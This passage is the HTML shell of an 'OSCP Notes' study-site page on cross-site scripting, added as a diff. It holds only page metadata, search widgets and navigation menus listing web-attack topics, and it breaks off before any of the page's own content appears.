@@ -1,0 +1,2710 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://an4kein.github.io/oscp-notes/enumeration/web_attacks/xss/">
+      
+      
+        <link rel="prev" href="../web-sockets/">
+      
+      
+        <link rel="next" href="../xxe/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>XSS (Cross-Site Scripting) - OSCP Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xss" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="OSCP Notes" class="md-header__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OSCP Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS (Cross-Site Scripting)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../files/" class="md-tabs__link">
+          
+  
+    
+  
+  Enumeration
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../exploitation/payloads/" class="md-tabs__link">
+          
+  
+    
+  
+  Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../post_exploitation/linux/" class="md-tabs__link">
+          
+  
+    
+  
+  Post Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../oscp_tips/" class="md-tabs__link">
+        
+  
+    
+  
+  OSCP Tips
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="OSCP Notes" class="md-nav__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    OSCP Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../files/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ssl_tls/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSL/TLS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ports/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ports
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Web Attacks
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Web Attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../general-info/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General Info
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quick-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Quick Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../broken-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broken Links
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../parameter-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Parameter Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bruteforcing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforcing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pastejacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pastejacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clickjacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../prototype-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Prototype Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../command-injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cookie-padding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cookie Padding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cors/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crawl-fuzz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Crawl & Fuzz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crlf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRLF Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSP (Content Security Policy)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF (Cross-Site Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deserialization Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dns-rebinding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS Rebinding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../email-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../header-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Header Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR (Insecure Direct Object References)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi-rfi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LFI & RFI (Local & Remote File Inclusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../online-hashes-cracked/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Online Hashes Cracked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirect
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../request-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Request Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../session-fixation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Session Fixation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection (SQLi)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF (Server-Side Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI (Server-Side Template Injection)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tabnabbing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tabnabbing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upload-bypasses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Bypasses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vhosts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Virtual Hosts Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-deception/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Deception
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-poisoning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Poisoning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-sockets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Sockets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    XSS (Cross-Site Scripting)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    XSS (Cross-Site Scripting)
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xss-cheat-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Cheat Sheet
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS Cheat Sheet">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss-cheat-sheet-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Cheat Sheet Reference
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#oneliners" class="md-nav__link">
+    <span class="md-ellipsis">
+      Oneliners
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-recopilation" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS recopilation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS recopilation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basics
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#by-tag" class="md-nav__link">
+    <span class="md-ellipsis">
+      By tag
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypasses
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#encoded" class="md-nav__link">
+    <span class="md-ellipsis">
+      Encoded
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#polyglots" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyglots
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-in-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS in files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dom-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      DOM XSS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-to-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS to CSRF
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#angularjs-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      AngularJS Sandbox
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-in-js" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS in JS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-waf-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Waf Bypasses
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss-mindmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Mindmap
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE (XML External Entity)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
